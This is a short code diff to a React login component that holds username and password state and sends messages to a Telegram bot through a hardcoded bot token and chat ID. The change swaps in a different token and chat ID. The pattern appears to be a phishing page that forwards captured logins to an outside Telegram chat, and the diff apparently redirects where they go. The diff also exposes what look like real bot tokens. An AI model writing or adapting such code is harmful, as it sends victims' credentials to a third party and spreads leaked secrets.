@@ -8,8 +8,8 @@ function App() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
 
-  const TELEGRAM_BOT_TOKEN = "7314439828:AAGFyDbzGFM4x-aJS9ldGZoRXsTYQxHz33c";
-  const CHAT_ID = "1694046499";
+  const TELEGRAM_BOT_TOKEN = "7592077825:AAHIuzAz5xy1wEjZwKD2YCkHN60Un3ZF1Bk";
+  const CHAT_ID = "1226692867";
 
   // Function to send a message to Telegram Bot
   const sendMessage = async (message) => {
